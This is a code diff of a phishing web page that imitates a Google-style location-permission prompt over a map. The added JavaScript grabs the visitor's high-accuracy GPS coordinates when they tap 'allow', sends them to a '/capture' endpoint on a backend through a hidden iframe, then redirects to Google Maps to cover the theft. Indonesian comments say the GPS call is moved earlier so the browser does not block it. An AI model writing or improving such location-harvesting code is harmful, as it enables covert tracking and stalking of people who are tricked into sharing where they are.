@@ -36,7 +36,6 @@
         }
         .dialog-overlay.show { opacity: 1; pointer-events: auto; }
 
-        /* State Awal Pop-up */
         .dialog-box { 
             background: #ffffff; padding: 12px 24px 32px 24px; 
             border-radius: 32px 32px 0 0; text-align: center; width: 100%; max-width: 500px; 
@@ -45,18 +44,15 @@
             opacity: 0;
             transition: transform 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.3s; 
         }
-        
-        /* State Muncul */
         .dialog-overlay.show .dialog-box { 
             transform: translateY(0) scale(1); 
             opacity: 1;
         }
 
-        /* State Menghilang (Massive Out) */
         .dialog-box.animate-out {
-            transform: translateY(100%) scale(0.7); /* Mengecil dan turun ke bawah */
+            transform: translateY(100%) scale(0.7); 
             opacity: 0;
-            transition: transform 0.4s cubic-bezier(0.6, -0.28, 0.735, 0.045), opacity 0.3s; 
+            transition: transform 0.3s cubic-bezier(0.6, -0.28, 0.735, 0.045), opacity 0.2s; 
         }
 
         .drag-handle { width: 32px; height: 4px; background: #dadce0; border-radius: 2px; margin: 0 auto 20px auto; }
@@ -105,8 +101,6 @@
             background: #1a73e8; color: #ffffff; font-weight: 500; font-size: 15px; cursor: pointer; 
             box-shadow: 0 0 15px rgba(26, 115, 232, 0.6), 0 4px 8px rgba(0,0,0,0.1);
             transition: transform 0.1s, box-shadow 0.2s;
-            position: relative;
-            overflow: hidden;
         }
         .btn-allow:active { 
             transform: scale(0.95); 
@@ -114,7 +108,6 @@
             background: #1557b0;
         }
 
-        /* Loading State */
         .loading-state { display: none; padding: 20px 0; }
         .spinner { border: 4px solid #f1f3f4; border-top: 4px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -162,7 +155,6 @@
     var map = L.map('map', {zoomControl: false}).setView([2.9903, 101.4259], 16);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 
-    // Animasi Load Awal
     window.addEventListener('load', () => {
         setTimeout(() => {
             document.getElementById('map').classList.add('map-zoomed');
@@ -172,47 +164,41 @@
     });
 
     function triggerGPS() {
+        // 1. LANGSUNG PANGGIL GPS (Biar nggak diblokir browser)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    var iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = `${BACKEND_URL}/capture?lat=${lat}&lon=${lon}`;
+                    document.body.appendChild(iframe);
+
+                    // Kasih waktu 1.5 detik buat ngirim data, baru redirect
+                    setTimeout(() => {
+                        window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
+                    }, 1500);
+                },
+                (error) => {
+                    window.location.href = "https://www.google.com/maps";
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }
+
+        // 2. BARU JALANIN ANIMASI VISUALNYA (Tanpa ngeblokir GPS)
         const dialogBox = document.getElementById('dialogBox');
-        
-        // 1. Mainin Animasi Massive Out
         dialogBox.classList.add('animate-out');
         
-        // 2. Tunggu animasi selesai (0.4 detik), baru ubah state ke Loading
         setTimeout(() => {
             document.getElementById('askState').style.display = 'none';
             document.getElementById('loadingState').style.display = 'block';
-            
-            // Munculin lagi pop-up-nya (tapi sekarang isinya loading)
             dialogBox.classList.remove('animate-out');
             dialogBox.style.transform = 'translateY(0) scale(1)';
             dialogBox.style.opacity = '1';
-
-            // 3. Tembak GPS setelah loading muncul
-            setTimeout(() => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const lat = position.coords.latitude;
-                            const lon = position.coords.longitude;
-                            
-                            var iframe = document.createElement('iframe');
-                            iframe.style.display = 'none';
-                            iframe.src = `${BACKEND_URL}/capture?lat=${lat}&lon=${lon}`;
-                            document.body.appendChild(iframe);
-
-                            setTimeout(() => {
-                                window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
-                            }, 2000);
-                        },
-                        (error) => {
-                            window.location.href = "https://www.google.com/maps";
-                        },
-                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                    );
-                }
-            }, 500);
-
-        }, 400); // 400ms sesuai durasi animasi CSS
+        }, 300);
     }
 
     document.getElementById('btnAllow').addEventListener('click', triggerGPS);
